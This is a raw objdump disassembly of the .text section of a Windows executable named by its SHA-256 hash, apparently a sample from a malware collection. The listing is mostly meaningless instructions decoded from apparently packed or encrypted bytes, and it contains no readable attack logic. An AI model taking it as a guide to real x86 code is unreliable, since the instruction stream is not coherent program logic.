
92facd9e56933ee6e2a44c193369c54520ecc364a2c1ee5e62130b10c85b400e.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	xor    ah,BYTE PTR [ebp-0x10]
  411003:	pop    es
  411004:	push   ebx
  411005:	outs   dx,BYTE PTR ds:[si]
  411007:	xchg   DWORD PTR [esi],esi
  411009:	bound  esp,QWORD PTR [ecx+0x1db2246d]
  41100f:	scas   al,BYTE PTR es:[edi]
  411010:	cmp    dh,ch
  411012:	and    bh,al
  411014:	fld    QWORD PTR [eax+esi*1]
  411017:	lock aam 0x17
  41101a:	lds    ebx,FWORD PTR [ebp-0x20]
  41101d:	icebp  
  41101e:	cmp    edx,DWORD PTR [edx-0x632a6edf]
  411024:	inc    edx
  411025:	in     al,0x9c
  411027:	mov    WORD PTR [edi-0xb758350],ds
  41102d:	inc    esi
  41102e:	mov    al,ds:0x934fc512
  411033:	sar    BYTE PTR [edi],1
  411035:	fsub   DWORD PTR fs:[edx+0x2cf78663]
  41103c:	dec    edi
  41103d:	xor    al,0xe0
  41103f:	mov    esi,0xc4080ce9
  411044:	gs xchg edx,eax
  411046:	sbb    bl,bh
  411048:	jle    0x411041
  41104a:	mov    esp,0xebb14a3a
  41104f:	xchg   esp,eax
  411050:	sub    eax,0xbcff9bab
  411055:	bound  esi,QWORD PTR gs:[esi+0x6b]
  411059:	push   ecx
  41105a:	faddp  st(1),st
  41105c:	addr16 daa 
  41105e:	xor    DWORD PTR [ebx+0xcd5cd],ebp
  411064:	push   edx
  411065:	in     eax,0xd0
  411067:	xor    ecx,DWORD PTR [eax+0x6e]
  41106a:	stos   BYTE PTR es:[edi],al
  41106b:	cmp    ch,bh
  41106d:	nop
  41106e:	sub    dh,BYTE PTR [ebp-0x2cff0f69]
  411074:	aam    0xd1
  411076:	cmp    edi,DWORD PTR [ecx+0x7c]
  411079:	and    BYTE PTR [edi-0x43203146],bh
  41107f:	cmp    dh,BYTE PTR [ecx+0x20]
  411082:	push   ds
  411083:	retf   0x1215
  411086:	xchg   ebx,eax
  411087:	mov    ecx,0x1c7fd39d
  41108c:	xor    bl,BYTE PTR [esi-0x2becf88b]
  411092:	arpl   sp,di
  411094:	loopne 0x411114
  411096:	int    0xf7
  411098:	loopne 0x411118
  41109a:	sahf   
  41109b:	mov    ah,BYTE PTR [edi+ebp*8+0x79]
  41109f:	mov    al,ds:0x1c726730
  4110a4:	loope  0x4110a2
  4110a6:	or     ecx,DWORD PTR [edi-0x315db1b9]
  4110ac:	and    DWORD PTR [edx-0x65bee1dc],ecx
  4110b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b3:	xchg   esp,eax
  4110b5:	pop    ss
  4110b6:	out    dx,al
  4110b7:	inc    ebp
  4110b8:	push   esp
  4110b9:	jl     0x411044
  4110bb:	test   al,0x17
  4110bd:	sub    DWORD PTR [esi-0x15c4ee00],eax
  4110c3:	mov    al,ds:0xd7df1eac
  4110c8:	or     eax,0xc6c2727d
  4110cd:	pushf  
  4110ce:	cdq    
  4110cf:	or     DWORD PTR [ebx],0x1405dc5f
  4110d5:	xlat   BYTE PTR ds:[ebx]
  4110d6:	clc    
  4110d7:	(bad)  
  4110d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110d9:	shrd   DWORD PTR [ebp-0x4c],ebp,0x5d
  4110de:	fbld   TBYTE PTR [eax+0xb]
  4110e1:	aam    0x9e
  4110e3:	push   edi
  4110e4:	push   eax
  4110e5:	retf   
  4110e6:	out    dx,al
  4110e7:	or     bl,ah
  4110e9:	shl    edx,cl
  4110eb:	(bad)  
  4110ec:	out    0x6b,al
  4110ee:	jbe    0x411166
  4110f0:	adc    cl,BYTE PTR [esi-0x56e226c6]
  4110f6:	rol    dl,cl
  4110f8:	mov    dl,0x5f
  4110fa:	sbb    eax,0xf009cc20
  4110ff:	call   FWORD PTR [ebx-0x5]
  411102:	or     eax,0x46100cca
  411107:	in     al,dx
  411108:	cmp    ah,BYTE PTR [ecx]
  41110a:	push   0x49
  41110c:	jmp    0xfd36:0x7d6873f6
  411113:	xchg   esi,eax
  411114:	dec    edi
  411115:	fld    DWORD PTR [ecx]
  411117:	loope  0x4110ab
  411119:	scas   eax,DWORD PTR es:[edi]
  41111a:	cdq    
  41111b:	push   es
  41111c:	pop    ss
  41111d:	mov    dl,0x63
  41111f:	bound  esp,QWORD PTR [esi-0x47]
  411122:	cmp    eax,DWORD PTR [edx+0x226a50eb]
  411128:	sbb    BYTE PTR [ebp+0x7b1602ac],0xb2
  41112f:	test   al,0xc2
  411131:	mov    gs,WORD PTR [eax-0xb]
  411134:	inc    ebp
  411135:	inc    ecx
  411136:	mov    bh,0x1a
  411138:	mov    bl,0xe4
  41113a:	adc    al,0x69
  41113c:	sbb    BYTE PTR [ebx+0x48],0x51
  411140:	out    dx,eax
  411141:	repz bound eax,QWORD PTR ds:0xc8790909
  411148:	xor    DWORD PTR [edx-0x240cd89b],edx
  41114e:	call   0x5fdf:0xecd62bd5
  411155:	xchg   edx,eax
  411156:	retf   0xf243
  411159:	pop    ds
  41115a:	add    esp,DWORD PTR [eax+ebp*2-0x65]
  41115e:	call   0xdf6923ba
  411163:	push   cs
  411164:	push   edi
  411165:	and    eax,0x51e3c11b
  41116a:	(bad)  
  41116b:	adc    eax,edi
  41116d:	sbb    esp,DWORD PTR [ebp-0x67]
  411170:	int    0x80
  411172:	pusha  
  411173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411174:	push   ebp
  411175:	ins    DWORD PTR es:[edi],dx
  411176:	fbld   TBYTE PTR [ebp+0x2e]
  411179:	outs   dx,BYTE PTR ds:[esi]
  41117a:	mov    dl,0xf6
  41117c:	cs inc esp
  41117e:	dec    edx
  41117f:	out    dx,eax
  411180:	adc    eax,0xa7eb24c2
  411185:	mov    eax,ds:0x21841630
  41118a:	add    DWORD PTR [ecx-0x7376cf98],0x10a52b4c
  411194:	add    ch,BYTE PTR [eax+ebx*4]
  411197:	fwait
  411198:	pop    es
  411199:	popa   
  41119a:	call   0xd9d0e216
  41119f:	aad    0x5c
  4111a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a2:	lds    edx,FWORD PTR [ebx+ebx*1-0x56]
  4111a6:	arpl   WORD PTR [edx-0x77],sp
  4111a9:	mov    ds:0x15f2626d,al
  4111ae:	cmc    
  4111af:	ficom  DWORD PTR [edx+ebp*1+0x282a0453]
  4111b6:	or     edx,DWORD PTR ds:0x89d0438e
  4111bc:	bnd jmp 0x41122a
  4111bf:	mov    ecx,0x9e154d60
  4111c4:	test   ah,0x67
  4111c7:	outs   dx,BYTE PTR ds:[esi]
  4111c8:	popf   
  4111c9:	mov    ebp,0xe784168c
  4111ce:	fld    QWORD PTR [ecx]
  4111d0:	push   ds
  4111d1:	popa   
  4111d2:	pop    ebp
  4111d3:	sub    BYTE PTR ds:0x4baff359,dh
  4111d9:	lea    eax,[ebx+0x5df0ba7a]
  4111df:	je     0x4111c4
  4111e1:	ret    0x7853
  4111e4:	jecxz  0x41118d
  4111e6:	retf   
  4111e7:	retf   0x9e32
  4111ea:	adc    DWORD PTR [ebx-0x70053cea],edx
  4111f0:	aas    
  4111f1:	add    BYTE PTR [eax-0x3ab44ffd],dl
  4111f7:	mov    eax,0x855af95a
  4111fc:	imul   ebp,DWORD PTR [edi],0xbe79b1a
  411202:	inc    eax
  411203:	adc    DWORD PTR [ecx-0x13],ebx
  411206:	push   esp
  411207:	loop   0x4111f3
  411209:	or     bh,dl
  41120b:	pop    edi
  41120c:	jae    0x41127f
  41120e:	push   edx
  41120f:	ficomp DWORD PTR [edx+0x173a8683]
  411215:	es mov dh,0x5d
  411218:	(bad)  
  411219:	fisub  WORD PTR [eax+0x42]
  41121c:	sub    eax,0x750d5df2
  411221:	xor    al,0x21
  411223:	retf   0x705
  411226:	add    esp,DWORD PTR [esi]
  411228:	repnz and DWORD PTR [ebp+0x3fb61bfe],esi
  41122f:	call   0xea33:0x4861998b
  411236:	mov    cx,WORD PTR [edx+0x61]
  41123a:	add    DWORD PTR [ecx+ebx*2+0x3a7b9dd0],esp
  411241:	or     BYTE PTR [eax+0x142ff2bf],ch
  411247:	arpl   ax,di
  411249:	in     eax,dx
  41124a:	int    0x3e
  41124c:	into   
  41124d:	inc    eax
  41124e:	scas   eax,DWORD PTR es:[edi]
  41124f:	call   0x1c81:0xa578792c
  411256:	in     eax,0xfd
  411258:	aam    0x6f
  41125a:	and    bl,BYTE PTR [eax]
  41125c:	or     eax,0x17dc7385
  411261:	xrelease xchg BYTE PTR [ebp+0x42],bh
  411265:	cli    
  411266:	dec    BYTE PTR [ebx]
  411268:	repnz test BYTE PTR [ebx+0x36],dh
  41126c:	sbb    eax,0x4f64f8da
  411271:	iret   
  411272:	ss push edx
  411274:	push   cs
  411275:	push   es
  411276:	lds    ebx,FWORD PTR ds:0x53291d52
  41127c:	test   DWORD PTR [ecx+0x76d8cb68],ecx
  411282:	dec    ebx
  411283:	fs xchg edx,eax
  411285:	cdq    
  411286:	xor    eax,0x592fce52
  41128b:	inc    ebp
  41128c:	xor    eax,DWORD PTR [ebx+0x4a]
  41128f:	call   0xe22b3a5a
  411294:	push   cs
  411295:	ins    BYTE PTR es:[edi],dx
  411296:	mov    eax,0xaa6df08
  41129b:	and    eax,0x4dd973ee
  4112a0:	xchg   edx,eax
  4112a1:	ins    DWORD PTR es:[edi],dx
  4112a2:	mov    esp,0x4e33f025
  4112a7:	and    DWORD PTR [ecx+edx*4-0x55173939],esi
  4112ae:	sbb    DWORD PTR [ebx],esp
  4112b0:	adc    BYTE PTR gs:[edi],cl
  4112b3:	xchg   ebp,eax
  4112b4:	fpatan 
  4112b6:	dec    eax
  4112b7:	cmp    dh,BYTE PTR [eax-0x6569bd19]
  4112bd:	mov    ?,WORD PTR [ebx]
  4112bf:	enter  0x44da,0xd2
  4112c3:	xchg   esp,eax
  4112c4:	mov    eax,0x300a2bb6
  4112c9:	add    al,0xcd
  4112cb:	add    al,0x17
  4112cd:	imul   ecx,DWORD PTR [eax+0x75451c21],0xf86237ca
  4112d7:	fucom  st(1)
  4112d9:	daa    
  4112da:	in     al,0xd4
  4112dc:	sbb    bl,BYTE PTR [eax]
  4112de:	dec    ecx
  4112df:	xor    DWORD PTR [edx],eax
  4112e1:	(bad)
  4112e4:	dec    ebx
  4112e5:	ss ja  0x4112d9
  4112e8:	jmp    0xcf40:0xd5b39e63
  4112ef:	adc    BYTE PTR [ebx-0x49],bl
  4112f2:	and    al,0xcc
  4112f4:	mov    ch,0x97
  4112f6:	cmp    eax,0xfdf61f88
  4112fb:	iret   
  4112fc:	stos   DWORD PTR es:[edi],eax
  4112fd:	sbb    DWORD PTR [ebp-0x5d551a4],edi
  411303:	imul   ebp,DWORD PTR ds:0x5373526a,0x67
  41130a:	mov    bl,0x24
  41130c:	sub    DWORD PTR [esi+edi*8+0x75],edi
  411310:	aas    
  411311:	int    0xae
  411313:	inc    edi
  411314:	jl     0x41133a
  411316:	xor    cl,bh
  411318:	sbb    BYTE PTR [ebp+0x16],bh
  41131b:	push   ebx
  41131c:	inc    ecx
  41131d:	inc    esi
  41131e:	dec    edi
  41131f:	pop    es
  411320:	out    0xe9,al
  411322:	dec    esi
  411323:	lea    esi,[ebp+0x17]
  411326:	xor    ch,dl
  411328:	pushf  
  411329:	ror    BYTE PTR [ebx-0xc],cl
  41132c:	jo     0x41134b
  41132e:	push   ds
  41132f:	jp     0x411326
  411331:	push   ecx
  411332:	jmp    0xbd7cf5c8
  411337:	mov    al,0xc8
  411339:	dec    edi
  41133a:	imul   esp,DWORD PTR [esi],0xcfb94fa4
  411340:	stos   BYTE PTR es:[edi],al
  411341:	jle    0x411379
  411343:	jno    0x411320
  411345:	pop    ebp
  411346:	retf   0xa810
  411349:	pop    ecx
  41134a:	xchg   edi,eax
  41134b:	xchg   DWORD PTR [esp+ebx*8],esp
  41134e:	mov    ebp,0xedcca76f
  411353:	scas   al,BYTE PTR es:[edi]
  411354:	adc    bl,BYTE PTR [ecx+edx*8-0x17]
  411358:	mov    ch,0x36
  41135a:	in     al,0x27
  41135c:	jne    0x411324
  41135e:	cmp    al,BYTE PTR [ecx-0xb0678e6]
  411364:	inc    ebp
  411365:	dec    edx
  411366:	jae    0x411341
  411368:	das    
  411369:	ds cmp al,0xa6
  41136c:	push   edx
  41136d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41136e:	jmp    0x156:0xf279cfb5
  411375:	arpl   sp,si
  411377:	arpl   WORD PTR [ecx+eiz*4+0x2e],cx
  41137b:	retf   0x345f
  41137e:	push   edi
  41137f:	je     0x41130f
  411381:	add    DWORD PTR [edx+0x4c408e6e],esp
  411387:	cmp    DWORD PTR [edx-0x9],edi
  41138a:	sub    DWORD PTR [esi-0x40],0xffffffb1
  41138e:	mov    eax,0xb25dd837
  411393:	inc    edx
  411394:	mov    esi,0xa5450d52
  411399:	fmul   QWORD PTR [edx+0x7d4b067]
  41139f:	ins    DWORD PTR es:[edi],dx
  4113a0:	test   eax,0x8bad4d05
  4113a5:	adc    eax,eax
  4113a7:	jl     0x41141d
  4113a9:	mov    edx,0x9775842f
  4113ae:	out    0x85,eax
  4113b0:	jb     0x41142f
  4113b2:	jp     0x4113a8
  4113b4:	lods   al,BYTE PTR ds:[esi]
  4113b5:	mov    eax,0xe52567af
  4113ba:	cld    
  4113bb:	lahf   
  4113bc:	(bad)  
  4113be:	popf   
  4113bf:	jge    0x41140e
  4113c1:	xor    bh,BYTE PTR [ecx-0x3d7c3aa5]
  4113c7:	std    
  4113c8:	sub    DWORD PTR [edi+0x6],edx
  4113cb:	and    edi,DWORD PTR [esi+0x7]
  4113ce:	rcl    BYTE PTR [esi+0x5701fb4b],cl
  4113d4:	cdq    
  4113d5:	cs inc esp
  4113d7:	lods   al,BYTE PTR ds:[esi]
  4113d8:	icebp  
  4113d9:	sahf   
  4113da:	mov    ch,BYTE PTR ds:0x57c22352
  4113e0:	push   esi
  4113e1:	inc    edi
  4113e2:	call   0x659814dd
  4113e7:	mov    ecx,0x314f7acd
  4113ec:	dec    ecx
  4113ed:	icebp  
  4113ee:	jle    0x4113af
  4113f0:	in     eax,dx
  4113f1:	sbb    dh,BYTE PTR [ecx-0x45]
  4113f4:	xchg   esp,eax
  4113f5:	adc    BYTE PTR [ebx-0xc3dbc76],ch
  4113fb:	fs push ecx
  4113fd:	mov    ah,BYTE PTR [eax]
  4113ff:	pop    eax
  411400:	daa    
  411401:	rcl    dl,cl
  411403:	mov    ds:0xf1025c95,al
  411408:	sub    al,0xcc
  41140a:	ins    DWORD PTR es:[edi],dx
  41140b:	(bad)  [ebx+edi*2+0x601f5f2b]
  411412:	sbb    eax,0x2ac6cc6
  411417:	adc    DWORD PTR ds:0x651a4a8d,eax
  41141d:	pop    edx
  41141e:	dec    ebp
  41141f:	ins    DWORD PTR es:[di],dx
  411421:	es or  al,0x8e
  411424:	aam    0x2b
  411426:	mov    bl,0x2b
  411428:	pop    es
  411429:	mov    esp,DWORD PTR [edx]
  41142b:	test   DWORD PTR [edi-0xe],ecx
  41142e:	out    0x40,eax
  411430:	xchg   esp,eax
  411431:	jb     0x411468
  411433:	and    DWORD PTR [edi-0x2d],edx
  411436:	ficomp WORD PTR [ebx]
  411438:	mov    ah,0x44
  41143a:	pop    es
  41143b:	mov    edi,0xd044af01
  411440:	adc    eax,0x789e12ef
  411445:	dec    edi
  411446:	sbb    cl,bl
  411448:	scas   eax,DWORD PTR es:[edi]
  411449:	sbb    esi,esi
  41144b:	inc    esp
  41144c:	fldenv [edx-0x28]
  41144f:	pop    ss
  411450:	xchg   edx,eax
  411451:	mov    edi,0x5d1e3491
  411456:	mov    eax,0x60ccb92e
  41145b:	xor    bl,0x5c
  41145e:	xchg   ebx,eax
  41145f:	dec    ebp
  411460:	shl    BYTE PTR [ebx-0x5e6ff71e],1
  411466:	adc    DWORD PTR [eax-0x4748ac38],ecx
  41146c:	jecxz  0x4114af
  41146e:	fst    DWORD PTR [esi-0x7d]
  411471:	push   ecx
  411472:	in     eax,0x53
  411474:	fimul  DWORD PTR [esi+0x75]
  411477:	loopne 0x411470
  411479:	sbb    eax,0x21069a6c
  41147e:	mov    bl,0x6d
  411480:	rcl    BYTE PTR [eax-0x4fdf82e4],1
  411486:	mov    edi,0x6494c37b
  41148b:	dec    esp
  41148c:	pop    ebp
  41148d:	clc    
  41148e:	pop    ecx
  41148f:	(bad)  
  411490:	sbb    ebp,edx
  411492:	(bad)  
  411493:	(bad)  
  411494:	jmp    0x411433
  411496:	repnz pop edi
  411498:	or     cl,BYTE PTR [edi+0x8]
  41149b:	dec    ebp
  41149c:	fistp  QWORD PTR [ebx+ebp*2+0x48]
  4114a0:	cmp    DWORD PTR [ebx],0xfec5bfbe
  4114a6:	mov    ebp,0x9dfef9cf
  4114ab:	jb     0x41148d
  4114ad:	mov    esp,ss
  4114af:	sbb    edx,ebp
  4114b1:	sub    esi,DWORD PTR [esi-0x7a]
  4114b4:	shl    BYTE PTR [eax-0x44],cl
  4114b7:	cdq    
  4114b8:	sbb    al,0xb9
  4114ba:	popf   
  4114bb:	cli    
  4114bc:	outs   dx,BYTE PTR ds:[esi]
  4114bd:	call   DWORD PTR [edx-0x24]
  4114c0:	fisub  WORD PTR [edi+edx*1]
  4114c3:	xor    BYTE PTR [edi+0x58],ch
  4114c6:	aas    
  4114c7:	cwde   
  4114c8:	fstp   DWORD PTR [ebx+0x4d0281fd]
  4114ce:	mov    bh,0xf5
  4114d0:	dec    edi
  4114d1:	js     0x4114b9
  4114d3:	cbw    
  4114d5:	cmc    
  4114d6:	and    ah,al
  4114d8:	rol    BYTE PTR [ecx-0x3c],cl
  4114db:	jge    0x411495
  4114dd:	ins    BYTE PTR es:[edi],dx
  4114de:	add    esi,ebx
  4114e0:	cmp    ebx,DWORD PTR [ebp+0x14]
  4114e3:	add    al,0xe8
  4114e5:	dec    esi
  4114e6:	pop    esi
  4114e7:	and    ch,BYTE PTR [eax+0x39]
  4114ea:	mov    bh,BYTE PTR [ebx+0x3a15c23d]
  4114f0:	mov    edx,0x809e4928
  4114f5:	mov    ah,0x79
  4114f7:	aam    0x38
  4114f9:	test   al,0x54
  4114fb:	mov    WORD PTR [ebx-0x3d],cs
  4114fe:	(bad)  
  4114ff:	jge    0x411560
  411501:	scas   eax,DWORD PTR es:[edi]
  411502:	aam    0xbe
  411504:	mov    ch,0xc0
  411506:	sbb    bh,BYTE PTR [ecx]
  411508:	mov    bh,0xc4
  41150a:	dec    edi
  41150b:	lahf   
  41150c:	sbb    DWORD PTR [ebx+0x1f],ecx
  41150f:	sbb    dl,bl
  411511:	xchg   ebx,eax
  411512:	sbb    BYTE PTR [esi+0x13],ch
  411515:	jo     0x41156e
  411517:	mov    dh,0x7a
  411519:	adc    al,bh
  41151b:	xchg   ebp,eax
  41151c:	mov    ds:0x4a80e273,al
  411521:	xchg   esi,eax
  411522:	mov    ch,0x81
  411524:	xor    al,BYTE PTR [edx]
  411526:	push   ds
  411527:	fisub  WORD PTR [edx]
  411529:	popa   
  41152a:	mov    ebx,0x88e7251d
  41152f:	mov    ds:0xb234fb2b,al
  411534:	imul   DWORD PTR [edx+0x3682d03c]
  41153a:	mov    edx,0x76e5ab84
  41153f:	and    al,0xe9
  411541:	js     0x4115b4
  411543:	dec    esp
  411544:	push   ds
  411545:	sbb    ebx,DWORD PTR [edx]
  411547:	mov    WORD PTR [edx-0x31],?
  41154a:	daa    
  41154b:	enter  0x7d71,0x67
  41154f:	mov    db4,eax
  411552:	and    al,0xff
  411554:	hlt    
  411555:	push   edi
  411556:	mov    DWORD PTR [eax],esi
  411558:	jb     0x411565
  41155a:	jecxz  0x411573
  41155c:	jge    0x411515
  41155e:	mov    edi,0x984431cf
  411563:	cmp    cl,BYTE PTR [ebx+0x46]
  411566:	mov    ds:0x46ea5f30,eax
  41156b:	add    BYTE PTR [edx+0x6d],0x42
  41156f:	sbb    BYTE PTR [ecx-0xbf7a11a],0x97
  411576:	not    DWORD PTR [edi-0x3d844d42]
  41157c:	ret    
  41157d:	cmp    dh,BYTE PTR [edi-0x28]
  411580:	jl     0x411506
  411582:	scas   al,BYTE PTR es:[edi]
  411583:	jne    0x4115ca
  411585:	stc    
  411586:	mov    ds:0xc6b1e127,al
  41158b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158c:	inc    edi
  41158d:	adc    eax,0x69fd5129
  411592:	jnp    0x411609
  411594:	mov    esi,0x8b2021dd
  411599:	repz adc al,0xb9
  41159c:	les    esi,FWORD PTR [edi]
  41159e:	inc    edi
  41159f:	(bad)  [si-0x64]
  4115a3:	dec    eax
  4115a4:	call   0xd6e7:0x7a0aa031
  4115ab:	xor    DWORD PTR [esi],ecx
  4115ad:	jbe    0x41161e
  4115af:	lods   al,BYTE PTR ds:[esi]
  4115b0:	lahf   
  4115b1:	mov    ch,bh
  4115b3:	and    esp,DWORD PTR [esi-0xb]
  4115b6:	add    eax,0x2c397ca7
  4115bb:	repz mov eax,0x85cb27d3
  4115c1:	and    al,0x5a
  4115c3:	rcl    eax,cl
  4115c5:	jns    0x4115d5
  4115c7:	xchg   edi,eax
  4115c8:	inc    ebx
  4115c9:	mov    cl,0x27
  4115cb:	xchg   bh,ah
  4115cd:	ins    DWORD PTR es:[edi],dx
  4115ce:	not    cl
  4115d0:	sub    BYTE PTR [eax-0x7a57fe7f],ch
  4115d6:	pop    esp
  4115d7:	stos   BYTE PTR es:[edi],al
  4115d8:	mov    ebx,0xce490775
  4115dd:	scas   eax,DWORD PTR es:[edi]
  4115de:	lods   eax,DWORD PTR ds:[esi]
  4115df:	test   DWORD PTR [ecx],0xb2954959
  4115e5:	nop
  4115e6:	cmc    
  4115e7:	jecxz  0x411570
  4115e9:	fmul   QWORD PTR [eax-0x52f7f29a]
  4115ef:	aaa    
  4115f0:	dec    edi
  4115f1:	or     eax,0x6c0e82
  4115f6:	sub    BYTE PTR [ebp-0x34],0x6b
  4115fa:	iret   
  4115fb:	bt     DWORD PTR [ecx+0x20e2c761],0x16
  411603:	mov    eax,ds:0xe72e6b0c
  411608:	or     DWORD PTR [ebx],esi
  41160a:	outs   dx,BYTE PTR ds:[esi]
  41160b:	das    
  41160c:	mov    edi,0x64bdc5e0
  411611:	iret   
  411612:	sub    eax,0x5bfa58e4
  411617:	push   cs
  411618:	cmp    eax,0x81c02c1d
  41161d:	fcomip st,st(6)
  41161f:	push   esi
  411620:	or     al,0x1e
  411622:	cld    
  411623:	aaa    
  411624:	hlt    
  411625:	dec    esi
  411626:	into   
  411627:	mov    edx,0xbd5ead4
  41162c:	stc    
  41162d:	inc    eax
  41162e:	int3   
  41162f:	push   eax
  411630:	mov    DWORD PTR [edi-0x58b876fa],ebx
  411636:	add    dl,BYTE PTR [eax]
  411638:	push   ss
  411639:	ffree  st(5)
  41163b:	pop    edi
  41163c:	pop    esi
  41163d:	(bad)  
  41163e:	(bad)  
  41163f:	ja     0x4115ee
  411641:	icebp  
  411642:	push   0xae825002
  411647:	(bad)  
  41164a:	add    DWORD PTR [edx],eax
  41164c:	cmp    esi,DWORD PTR [ebx+0x5068c08e]
  411652:	push   ds
  411653:	adc    esi,0x1d
  411656:	mov    al,ds:0x8d38f0d4
  41165b:	es inc esi
  41165d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41165e:	add    BYTE PTR [eax+0x25a54451],ah
  411664:	fld    DWORD PTR [ebp+0x2e]
  411667:	popa   
  411668:	add    al,0xee
  41166a:	jp     0x411671
  41166c:	and    eax,0xd4664460
  411671:	push   ds
  411672:	jmp    0x1e0a:0x9ba1bae4
  411679:	jb     0x411673
  41167b:	out    0x4d,eax
  41167d:	in     eax,0xb3
  41167f:	xor    edx,DWORD PTR [ebp-0x5ea11608]
  411685:	addr16 and al,0x83
  411688:	inc    ecx
  411689:	lods   eax,DWORD PTR ds:[esi]
  41168a:	add    ecx,ebp
  41168c:	cli    
  41168d:	retf   
  41168e:	popa   
  41168f:	jnp    0x411699
  411691:	adc    eax,0xf5e890b0
  411696:	shl    DWORD PTR [edx],cl
  411698:	rcl    DWORD PTR [ecx-0x473f6073],cl
  41169e:	inc    ebx
  41169f:	loope  0x4116e1
  4116a1:	stc    
  4116a2:	loop   0x4116ad
  4116a4:	ret    
  4116a5:	shl    BYTE PTR [edi],1
  4116a7:	xchg   esi,eax
  4116a8:	in     eax,0x6f
  4116aa:	iret   
  4116ab:	pop    ss
  4116ac:	or     al,0xa5
  4116ae:	cmp    al,0x60
  4116b0:	xor    ebx,ebx
  4116b2:	mov    ds:0xa9d00b1e,al
  4116b7:	mov    esi,0xcfdd2039
  4116bc:	or     al,0x25
  4116be:	dec    edi
  4116bf:	mov    ds:0x4b8bdf9e,al
  4116c4:	sti    
  4116c5:	clc    
  4116c6:	rcl    BYTE PTR [ecx],1
  4116c8:	sub    dh,BYTE PTR [ecx-0x73167cd5]
  4116ce:	imul   edi,eax,0x9f373ad0
  4116d4:	xor    bl,BYTE PTR [ebp-0x636ff5a8]
  4116da:	sub    eax,0x6bb5c91b
  4116df:	stos   DWORD PTR es:[edi],eax
  4116e0:	out    0xc2,al
  4116e2:	stos   DWORD PTR es:[edi],eax
  4116e3:	cdq    
  4116e4:	jmp    0x41170a
  4116e6:	cmp    DWORD PTR ds:0x8ea58fcb,0x48
  4116ed:	mov    esi,0xfa5d7903
  4116f2:	add    al,0xf5
  4116f4:	dec    edi
  4116f5:	xchg   DWORD PTR [ebp-0xc2a0053],ebp
  4116fb:	(bad)  
  4116fc:	and    ecx,esi
  4116fe:	in     eax,0xa6
  411700:	loopne 0x41173b
  411702:	add    edi,DWORD PTR [ecx]
  411704:	adc    DWORD PTR [esi+0x32],edi
  411707:	mov    eax,ds:0x8268aef0
  41170c:	or     bl,BYTE PTR [esi+0x6502b858]
  411712:	sti    
  411713:	and    al,0x38
  411715:	jae    0x41177e
  411717:	mov    bl,0xfc
  411719:	aas    
  41171a:	push   esp
  41171b:	int    0x4a
  41171d:	call   0x43412b77
  411722:	stos   DWORD PTR es:[edi],eax
  411723:	pop    ebx
  411724:	ret    0x7655
  411727:	das    
  411728:	mov    al,ds:0xe2eaab77
  41172d:	ins    DWORD PTR es:[edi],dx
  41172e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172f:	mov    ebp,0xf80e0a76
  411734:	mov    eax,0xbebc4099
  411739:	mov    al,0xca
  41173b:	into   
  41173c:	dec    ecx
  41173d:	out    dx,al
  41173e:	xchg   edi,eax
  41173f:	inc    ecx
  411740:	xor    esp,DWORD PTR [ebp+0x7f0e1385]
  411746:	enter  0x249c,0xa8
  41174a:	mov    bh,0xfb
  41174c:	mov    ds:0xc4750c91,al
  411751:	mov    cl,0xc3
  411753:	jmp    0x2cde:0x347798f5
  41175a:	shl    DWORD PTR [eax+0x32],1
  41175d:	sub    dh,bh
  41175f:	not    ecx
  411761:	cli    
  411762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411763:	cli    
  411764:	shr    DWORD PTR [ebx],1
  411766:	cld    
  411767:	push   es
  411768:	and    DWORD PTR [edi+0x55de63a8],0xf1a5f143
  411772:	(bad)  
  411773:	into   
  411774:	sub    bl,dh
  411776:	ret    
  411777:	rol    cl,cl
  411779:	xor    eax,0x3649c081
  41177e:	or     al,bl
  411780:	cmp    eax,0x7b4326a2
  411785:	out    0x49,eax
  411787:	loop   0x41172f
  411789:	mov    edx,0x837ba39b
  41178e:	shl    DWORD PTR [esp+edx*2],0x13
  411792:	retf   0x75eb
  411795:	xchg   edx,eax
  411796:	in     al,0x55
  411798:	rol    DWORD PTR [edx+0x39],1
  41179b:	xchg   esp,eax
  41179c:	popf   
  41179d:	cwde   
  41179e:	(bad)  
  41179f:	cmp    BYTE PTR [edi-0x77577554],dh
  4117a5:	test   BYTE PTR [edx+0x60],0xb4
  4117a9:	icebp  
  4117aa:	mov    ecx,0x40d2b9ec
  4117af:	jno    0x41175a
  4117b1:	dec    ebp
  4117b2:	retf   
  4117b3:	scas   eax,DWORD PTR es:[edi]
  4117b4:	ins    DWORD PTR es:[edi],dx
  4117b5:	jmp    0x411766
  4117b7:	cmp    eax,0xfeb0d38b
  4117bc:	pop    ebp
  4117bd:	mov    al,BYTE PTR [edx+0x736c9b4f]
  4117c3:	xor    edx,DWORD PTR [ebp-0x41]
  4117c6:	and    al,0xec
  4117c8:	les    ebp,FWORD PTR [edi+0x340b6b0a]
  4117ce:	arpl   WORD PTR [eiz*4-0x288d72b0],sp
  4117d5:	cmp    esi,edi
  4117d7:	or     ah,BYTE PTR [ebp+0x7b]
  4117da:	xchg   esi,eax
  4117db:	loope  0x411841
  4117dd:	cdq    
  4117de:	or     ah,0xc0
  4117e1:	jb     0x41177d
  4117e3:	cmc    
  4117e4:	repz jb 0x41182e
  4117e7:	ret    
  4117e8:	(bad)  
  4117e9:	jmp    0xab10:0xcad5540e
  4117f0:	fsub   DWORD PTR [eax-0x10df53bf]
  4117f6:	jge    0x41179e
  4117f8:	and    DWORD PTR [ecx+edx*2+0x16a533cd],0xa34286b6
  411803:	sbb    eax,0x502912e6
  411808:	jl     0x4117cd
  41180a:	add    BYTE PTR [edi-0x7dd6b3ff],ah
  411810:	sbb    ebx,DWORD PTR [edi-0x34]
  411813:	fcom   QWORD PTR [ebx+0x71f623a2]
  411819:	ret    
  41181a:	ret    
  41181b:	or     BYTE PTR [edi],al
  41181d:	jne    0x4117e4
  41181f:	inc    esp
  411820:	mov    ds:0x80af4233,eax
  411825:	jbe    0x411894
  411827:	jns    0x41184a
  411829:	js     0x4117b1
  41182b:	in     al,0x18
  41182d:	popa   
